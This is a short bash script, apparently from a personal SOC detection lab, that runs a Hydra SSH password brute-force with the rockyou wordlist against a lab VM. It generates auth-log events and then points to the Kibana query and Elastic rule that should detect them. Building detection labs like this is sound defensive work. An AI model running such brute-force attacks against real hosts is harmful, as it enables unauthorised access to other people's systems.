#!/bin/bash
# =============================================================================
# Script      : ssh-bruteforce.sh
# Author      : KuRo (KuRo0x)
# Lab         : KuRo SOC Detection Lab
# Incident    : INC-009 — SSH Brute Force (Linux Auth Log)
# Attacker VM : kali (172.16.0.11)
# Target VM   : ubuntu-victim (172.16.0.20) — SSH daemon on TCP 22
# Purpose     : Simulate SSH brute-force using Hydra to generate
#               Failed/Accepted password events in /var/log/auth.log
#               shipped by Filebeat 8.19.15 to Elasticsearch (filebeat-* index)
# Detection   : Elastic Security rule — "Linux SSH Failed Authentication Attempt"
# MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing | TA0006 Credential Access
# WARNING     : Run ONLY inside the isolated VMnet3 lab network (172.16.0.0/24)
# =============================================================================

TARGET="172.16.0.20"
PORT="22"
USER="kali"
WORDLIST="/usr/share/wordlists/rockyou.txt"
THREADS="4"

echo "[*] Starting SSH brute-force against $TARGET:$PORT"
echo "[*] User     : $USER"
echo "[*] Wordlist : $WORDLIST"
echo "[*] Threads  : $THREADS"
echo "[*] Expected logs: /var/log/auth.log on ubuntu-victim"
echo "[*] Expected index: filebeat-* in Kibana"
echo ""

hydra -l "$USER" \
      -P "$WORDLIST" \
      -t "$THREADS" \
      -s "$PORT" \
      -vV \
      ssh://"$TARGET"

echo ""
echo "[*] Attack complete. Check Kibana Discover:"
echo "    Index: filebeat-*"
echo "    KQL  : message: \"Failed password\" and message: \"172.16.0.11\""
echo "    Rule : Linux SSH Failed Authentication Attempt"
